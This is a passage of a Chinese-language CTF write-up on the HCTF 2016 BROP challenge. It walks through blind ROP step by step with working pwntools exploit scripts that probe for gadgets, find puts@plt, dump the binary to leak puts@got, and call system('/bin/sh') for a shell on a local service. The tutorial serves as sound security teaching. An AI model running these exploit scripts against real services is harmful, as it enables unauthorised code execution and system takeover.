<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">+---------------------------+</span> </span><br><span class="line">|           traps           | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line"><span class="code">+---------------------------+</span> </span><br><span class="line">|           stop            | &lt;----- stop gadget，不会使程序崩溃，作为probe的ret位</span><br><span class="line"><span class="code">+---------------------------+</span> </span><br><span class="line">|           trap            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line"><span class="code">+---------------------------+</span></span><br><span class="line">|           trap            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line"><span class="code">+---------------------------+</span></span><br><span class="line">|           trap            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line"><span class="code">+---------------------------+</span></span><br><span class="line">|           trap            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line"><span class="code">+---------------------------+</span></span><br><span class="line">|           trap            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line"><span class="code">+---------------------------+</span></span><br><span class="line">|           trap            | &lt;----- trap，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line"><span class="code">+---------------------------+</span></span><br><span class="line">|           probe           | &lt;----- 探针</span><br><span class="line">-----------------------------</span><br></pre></td></tr></table></figure>

<p>我们可以通过程序是否崩溃来判断probe探针中可能存在的汇编语句，在这样布局的情况下，如果程序没有崩溃，说明stop gadget被执行了。<strong>说明该probe探针中存在6个pop操作，并且有ret</strong>，因为只有在6个pop操作之后probe后面的trap才能弹进寄存器，之后sp指针才能指向stop gadget，这个时候stop gadget只有在ret位置才能被执行，因此程序不会崩溃</p>
<p>回到我们之间说的寻找brop gadget环节，我们这个环节要找的就是libc_csu_init最后的6个pop加ret，那么根据前面的讲解我们可以大致的通过trap、stop这种方式做一个简单的排列：</p>
<p>addr，trap, trap, trap, trap, trap, trap, stop, traps</p>
<p>以上面这种排列的话，addr通过循环不断增加地址位，只有addr所在地址拥有6个pop操作并ret的时候才会执行stopgadget。</p>
<p>循环内容：递增地址，找到可以执行6个pop和一个ret操作的gadget<br>循环终止条件：程序不崩溃，并出现起始的输出提示’WelCome’字符<br>执行目的：找到libc_csu_init函数的最后一个gadget，通过偏移计算出popr di地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_brop_gadget</span><span class="params">(length, stop_gadget, addr)</span>:</span> <span class="comment">#查找brop gadget函数</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">        <span class="comment">#sh = process('./brop')</span></span><br><span class="line">        sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">        payload = <span class="string">'a'</span> * length + p64(addr) + p64(h) + p64(o) + p64(l) + p64(l) + p64(k) + p64(<span class="number">0</span>) + p64(stop_gadget) + p64(h) + p64(o) + p64(l) + p64(l) + p64(k) </span><br><span class="line"><span class="comment">#通过72个a填满栈空间到ret，增长的地址覆盖原有的ret地址，接着用6个字符的p64形式充当trap，最后接上stop</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">print</span> content</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> content.startswith(<span class="string">'WelCome'</span>):</span><br><span class="line">          <span class="comment">#判断提示符是否出现起始提示字符，如果有说明程序没崩溃</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_brop_gadget</span><span class="params">(length, addr)</span>:</span><span class="comment">#检查地址</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">        <span class="comment">#sh = process(',.brop')</span></span><br><span class="line">        sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">        payload = <span class="string">'a'</span> * length + p64(addr) + <span class="string">'a'</span> * <span class="number">8</span> * <span class="number">10</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">##get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br><span class="line">addr = <span class="number">0x400740</span> </span><br><span class="line"><span class="comment">#理论上应该从0x400000开始寻找，但是这个环节要找的是Libc_csu_init函数，所以大多数的libc中Libc_csu_init函数的起始地址都在0x400740之后，所以为了减少误差，从0x400740开始</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:  <span class="comment">#循环递增要测试的地址</span></span><br><span class="line">    <span class="keyword">print</span> hex(addr)</span><br><span class="line">    <span class="keyword">if</span> get_brop_gadget(length, stop_gadget, addr):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'possible brop gadget: 0x%x'</span> % addr</span><br><span class="line">        <span class="keyword">if</span> check_brop_gadget(length, addr):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'success brop gadget: 0x%x'</span> % addr</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    addr += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>运行之后会得到很多的gadget地址，但是只有0x4007ba是可以继续进行操作的，如果想找到更多的gadget地址可以参考寻找stop gadget方法。但是经过后面内容的联合使用，只有0x4007ba可以执行。可以看一下IDA</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004007BA                 pop     rbx</span><br><span class="line">.text:00000000004007BB                 pop     rbp</span><br><span class="line">.text:00000000004007BC                 pop     r12</span><br><span class="line">.text:00000000004007BE                 pop     r13</span><br><span class="line">.text:00000000004007C0                 pop     r14</span><br><span class="line">.text:00000000004007C2                 pop     r15</span><br><span class="line">.text:00000000004007C4                 retn</span><br></pre></td></tr></table></figure>

<p>可以在IDA中看到0x4007ba处却是是libc_csu_init的gadget，实际操作中看不到二进制文件，这里使用IDA只是为了演示的更直观</p>
<p>栈中布局</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">             +---------------------------+</span><br><span class="line">             |<span class="string">       			 0    	       </span>|<span class="string"> trap</span></span><br><span class="line"><span class="string">             +---------------------------+</span></span><br><span class="line"><span class="string">             </span>|<span class="string">       	   .....           </span>|<span class="string"> trap</span></span><br><span class="line"><span class="string">             +---------------------------+</span></span><br><span class="line"><span class="string">             </span>|<span class="string">       			 0    	       </span>|<span class="string"> trap</span></span><br><span class="line"><span class="string">             +---------------------------+</span></span><br><span class="line"><span class="string">             </span>|<span class="string">       	stop gadget        </span>|<span class="string"> stop gadget作为ret返回地址</span></span><br><span class="line"><span class="string">             +---------------------------+</span></span><br><span class="line"><span class="string">             </span>|<span class="string">       			 0    	       </span>|<span class="string"> trap</span></span><br><span class="line"><span class="string">             +---------------------------+</span></span><br><span class="line"><span class="string">             </span>|<span class="string">       			 k    	       </span>|<span class="string"> trap</span></span><br><span class="line"><span class="string">             +---------------------------+</span></span><br><span class="line"><span class="string">             </span>|<span class="string">       			 l    	       </span>|<span class="string"> trap</span></span><br><span class="line"><span class="string">             +---------------------------+</span></span><br><span class="line"><span class="string">             </span>|<span class="string">       			 l    	       </span>|<span class="string"> trap</span></span><br><span class="line"><span class="string">             +---------------------------+</span></span><br><span class="line"><span class="string">             </span>|<span class="string">       			 o    	       </span>|<span class="string"> trap</span></span><br><span class="line"><span class="string">             +---------------------------+</span></span><br><span class="line"><span class="string">             </span>|<span class="string">       			 h    	       </span>|<span class="string"> trap</span></span><br><span class="line"><span class="string">             +---------------------------+</span></span><br><span class="line"><span class="string">             </span>|<span class="string">         0x400740+         </span>|<span class="string"> 递增地址覆盖原ret返回位置</span></span><br><span class="line"><span class="string">             +---------------------------+</span></span><br><span class="line"><span class="string">             </span>|<span class="string">             a             </span>|<span class="string"> a字符串覆盖原saved ebp位置</span></span><br><span class="line"><span class="string">      ebp---&gt;+---------------------------+</span></span><br><span class="line"><span class="string">             </span>|<span class="string">             a             </span>|<span class="string"> a字符串占位填满栈空间</span></span><br><span class="line"><span class="string">             </span>|<span class="string">           ....            </span>|<span class="string">        .....</span></span><br><span class="line"><span class="string">             </span>|<span class="string">             a             </span>|<span class="string"> a字符串占位填满栈空间</span></span><br><span class="line"><span class="string">             </span>|<span class="string">             a             </span>|<span class="string"> a字符串占位填满栈空间</span></span><br><span class="line"><span class="string">             </span>|<span class="string">             a             </span>|<span class="string"> a字符串占位填满栈空间</span></span><br><span class="line"><span class="string">             </span>|<span class="string">             a             </span>|<span class="string"> a字符串占位填满栈空间</span></span><br><span class="line"><span class="string">ebp-？--&gt;+---------------------------+</span></span><br></pre></td></tr></table></figure>

<p>在我们找到brop gadget之后加上0x9的偏移就可以得到pop rdi；ret操作的地址0x4007c3</p>
<p>###4、寻找puts@plt地址</p>
<p>通过前面的操作，我们可以总结一些规律，比如我们需要什么就把他扔进循环递增，总会有一次循环会得到我们想要的结果，在上一步我们找到了pop rdi；ret这个gadget的地址了，那么我们就可以控制puts函数的输出内容。我们就需要用这个gadget找到puts_plt的地址</p>
<p>根据上面所说的如果我们调用puts函数，必须将puts函数的参数地址先部署进rdi寄存器中，然后调用puts函数将rdi中地址内的参数打印出来</p>
<p>但是由于开启了NX保护，所以我们无法在栈中部署外部的变量或者字符串，那么我们就需要一个程序内部的特殊字符串，并且这个字符串必须唯一的。这里介绍一下，在没有开启PIE保护的情况下，0x400000处为ELF文件的头部，其内容为’ \ x7fELF’</p>
<p>循环内容：递增地址，找到可以进行打印的puts_plt地址<br>循环终止条件：接收字符串出现’\ x7fELF’字样<br>执行目的：为后续找到puts_got地址做准备</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_puts_addr</span><span class="params">(length, rdi_ret, stop_gadget)</span>:</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> hex(addr)</span><br><span class="line">        sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">        <span class="comment">#sh = process('./brop')</span></span><br><span class="line">        sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">        payload = <span class="string">'A'</span> * length + p64(rdi_ret) + p64(<span class="number">0x400000</span>) + p64(</span><br><span class="line">            addr) + p64(stop_gadget)</span><br><span class="line"><span class="comment">#72个A填充栈空间，调用pop rdi；ret gadget将0x400000pop进rdi寄存器，循环增长的地址放在gadget的ret位置，在执行完gadget后直接调用循环增长的地址，如果增长到puts_plt地址就会打印rdi寄存器中地址内存放的字符串，最后的stop gadget是为了让程序不崩溃</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            content = sh.recv()</span><br><span class="line">            <span class="keyword">if</span> content.startswith(<span class="string">'\x7fELF'</span>):<span class="comment">#判断是否打印\x7fELF</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">'find hollkdig puts@plt addr: 0x%x'</span> % addr</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            sh.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            sh.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line">rdi_ret = <span class="number">0x4007c3</span></span><br><span class="line"><span class="comment">##get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br></pre></td></tr></table></figure>

<p>最后根据plt的结构，选择0x400560 作为puts_plt的地址，我们使用IDA验证一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.plt:0000000000400550                 dq 2 dup(?)</span><br><span class="line">.plt:0000000000400560 ; [00000006 BYTES: COLLAPSED FUNCTION _puts. PRESS CTRL-NUMPAD+ TO EXPAND]</span><br><span class="line">.plt:0000000000400566                 dw ?</span><br></pre></td></tr></table></figure>

<p>可以看到该地址却是是puts函数的plt地址，正常情况下是看不到二进制文件的，此处看IDA是为了更好的讲解</p>
<p>栈中布局：</p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">             +---------------------------+</span><br><span class="line">             |       	<span class="type">stop</span> gadget        | <span class="type">stop</span> gadget确保程序不崩溃</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |       		<span class="type">0x400000</span>+        | <span class="type">循环递增地址，作为pop</span>的ret地址</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |        	<span class="type">0x400000</span> 	       | <span class="type">ELF</span>起始地址，地址内存放'、x7fELF'</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |          <span class="type">0x4007c3</span>         | <span class="type">pop</span> rdi；ret地址覆盖原ret返回位置</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |             <span class="type">a</span>             | <span class="type">a</span>字符串覆盖原saved ebp位置</span><br><span class="line">      ebp---&gt;+---------------------------+</span><br><span class="line">             |             <span class="type">a</span>             | <span class="type">a</span>字符串占位填满栈空间</span><br><span class="line">             |           <span class="type">....            |        .....</span></span><br><span class="line"><span class="type">             |             a</span>             | <span class="type">a</span>字符串占位填满栈空间</span><br><span class="line">             |             <span class="type">a</span>             | <span class="type">a</span>字符串占位填满栈空间</span><br><span class="line">             |             <span class="type">a</span>             | <span class="type">a</span>字符串占位填满栈空间</span><br><span class="line">             |             <span class="type">a</span>             | <span class="type">a</span>字符串占位填满栈空间</span><br><span class="line">ebp-？--&gt;+---------------------------+</span><br></pre></td></tr></table></figure>

<p>###5、泄露puts_got地址</p>
<p>在得到puts_plt地址后，接下来就需要将puts_got地址泄露出来，得到puts_got地址之后就可以利用LibcSearcher查找对应的libc版本，再根据版本找到libc中的system函数和/bin/sh</p>
<p>在泄露之前需要知道一下Linux中plt表和got表的关系，我们就拿puts函数举例</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">																		+--------------+</span><br><span class="line">																		|<span class="string">    GOT表     </span>|</span><br><span class="line">+---------------------+							+--------------+	找到真实地址   +--------------+</span><br><span class="line">|<span class="string">  PLT表  </span>|<span class="string"> jmp got表  </span>|<span class="string"> ---------&gt;  </span>|<span class="string">puts的真实地址 </span>|<span class="string"> -------------&gt;</span>|<span class="string">    puts函数   </span>|</span><br><span class="line">+---------------------+							+--------------+					     +--------------+</span><br><span class="line">	跳转到got表中存放puts						   |<span class="string">							</span>|</span><br><span class="line">	 函数真实地址的地址								  |<span class="string">							 </span>|</span><br><span class="line">																		|<span class="string">							 </span>|</span><br><span class="line">																		|<span class="string">							 </span>|</span><br><span class="line">																		|<span class="string">							 </span>|</span><br><span class="line">																		+--------------+</span><br></pre></td></tr></table></figure>

<p>我们可以根据上图我们模拟一下call puts的过程，在执行call puts之后程序首先会在PLT表中寻找puts_plt的地址，那么在puts_plt地址中存放的是GOT表中存放puts函数真实地址的地址（可能有点套娃，慢慢想），接下来会在GOT表中找到存放puts真实地址的地址，接下来打开盒子根据真实找到了puts函数</p>
<p>在ret2csu中我们使用的是LibcSearcher查找的函数got表地址，那么由于这道题开启了ASLR，所以不能使用工具去获取地址，那么我们手动的去找，找的就是在puts_plt地址中存放的jmp指令后接的地址。如果觉得不懂，看一下上面的图，jmp指令后面接的就是puts_got的地址。由于不能实用工具，我们只能手动的讲整个PLT部分都dump出来。dump出来的文件重新设置基地址0x400000，再根据前面得到的puts_plt地址找到对应位置，查看该地址内的汇编指令</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(length, rdi_ret, puts_plt, leak_addr, stop_gadget)</span>:</span></span><br><span class="line">    sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">    <span class="comment">#sh = process('./brop')</span></span><br><span class="line">    payload = <span class="string">'a'</span> * length + p64(rdi_ret) + p64(leak_addr) + p64(</span><br><span class="line">        puts_plt) + p64(stop_gadget)</span><br><span class="line"><span class="comment">#72个a填满栈空间至ret位置，后接pop rdi；ret gadget，循环递增的地址被pop进rdi寄存器，接下来将puts_plt地址防止在gadget ret位置进行调用打印循环递增的地址，最后加上stop gadget防止崩溃</span></span><br><span class="line">    sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = data[:data.index(<span class="string">"\nWelCome"</span>)]<span class="comment">#将接收的\nWelCome之前的字符串交给data变量</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data = data</span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">""</span>: <span class="comment">#如果data被赋值之后为空，那么就说明已经完成整个dump过程，添加\x00截断</span></span><br><span class="line">            data = <span class="string">'\x00'</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">##stop_gadget = get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br><span class="line"><span class="comment">##brop_gadget = find_brop_gadget(length,stop_gadget)</span></span><br><span class="line">brop_gadget = <span class="number">0x4007ba</span></span><br><span class="line">rdi_ret = brop_gadget + <span class="number">9</span></span><br><span class="line"><span class="comment">##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)</span></span><br><span class="line">puts_plt = <span class="number">0x400560</span></span><br><span class="line">addr = <span class="number">0x400000</span></span><br><span class="line">result = <span class="string">""</span> <span class="comment">#准备一个空字符串接收dump出来的代码</span></span><br><span class="line"><span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:   <span class="comment">#从0x400000开始泄露0x1000个字节，足以包含程序的plt部分</span></span><br><span class="line">    <span class="keyword">print</span> hex(addr)</span><br><span class="line">    data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>: <span class="comment">#判断接收字符是否为空</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result += data <span class="comment">#接收字符串</span></span><br><span class="line">    addr += len(data)  <span class="comment">#addr+接收字符串个数，避免接收重复的字符串</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'hollk'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:  <span class="comment">#在当前目录下以二进制形式向hollk文件中写</span></span><br><span class="line">    f.write(result)</span><br></pre></td></tr></table></figure>

<p>在执行完后会在本地当前目录下得到一个名为’hollk’的文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hollk@ubuntu:~/ctf-challenges/pwn/stackoverflow/brop/hctf2016-brop$ ls</span><br><span class="line">brop      core        hollk    Makefile   text1.py  text5.py</span><br><span class="line">brop.i64  deploy.sh   libc.so  nohup.out  text2.py  text6.py</span><br><span class="line">code      exploit.py  main.c   run.sh     text4.py</span><br></pre></td></tr></table></figure>

<p>这个文件就是我们dump出来的文件，其实你可以把他比作Windows下脱壳之后的文件。虽然在实际情况下我们看不到二进制文件，但是我们dump出来的plt段的内容可以使用IDA进行查看。将hollk文件拖进64位IDA，选择binary File形式打开，选择64-bit mode</p>
<p>接下来需要给hollk文件设置基地址，因为我们是从0x400000处开始dump的，所以基地址就设为0x400000<br>设置步骤：edit-&gt;segments-&gt;rebase program 将程序的基地址改为 0x400000</p>
<p>由于我们之前找到了puts函数的plt地址0x400560，所以我们找到偏移0x560处</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">seg000:000000000040055E                 db  40h ; @</span><br><span class="line">seg000:000000000040055F                 db    0</span><br><span class="line">seg000:0000000000400560                 db 0FFh</span><br><span class="line">seg000:0000000000400561                 db  25h ; %</span><br><span class="line">seg000:0000000000400562                 db 0B2h ; </span><br><span class="line">seg000:0000000000400563                 db  0Ah</span><br></pre></td></tr></table></figure>

<p>选中0x560，按c键，将此处数据转换为汇编指令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">seg000:000000000040055F                 db    0</span><br><span class="line">seg000:0000000000400560 ; -------------------------------------------------------------</span><br><span class="line">seg000:0000000000400560                 jmp     qword ptr cs:601018h</span><br><span class="line">seg000:0000000000400560 ; -------------------------------------------------------------</span><br><span class="line">seg000:0000000000400566                 db  68h ; h</span><br></pre></td></tr></table></figure>

<p>我们就可以看到puts_plt地址中jmp指令后面接的puts_got地址了，0x601018</p>
<p>###6、拿shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">##stop_gadget = get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br><span class="line"><span class="comment">##brop_gadget = find_brop_gadget(length,stop_gadget)</span></span><br><span class="line">brop_gadget = <span class="number">0x4007ba</span></span><br><span class="line">rdi_ret = brop_gadget + <span class="number">9</span></span><br><span class="line"><span class="comment">##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)</span></span><br><span class="line">puts_plt = <span class="number">0x400560</span></span><br><span class="line"><span class="comment">##leakfunction(length, rdi_ret, puts_plt, stop_gadget)</span></span><br><span class="line">puts_got = <span class="number">0x601018</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line"><span class="comment">#sh = process('./brop')</span></span><br><span class="line">sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(</span><br><span class="line">    stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">data = sh.recvuntil(<span class="string">'\nWelCome'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">puts_addr = u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * length + p64(rdi_ret) + p64(binsh_addr) + p64(</span><br><span class="line">    system_addr) + p64(stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

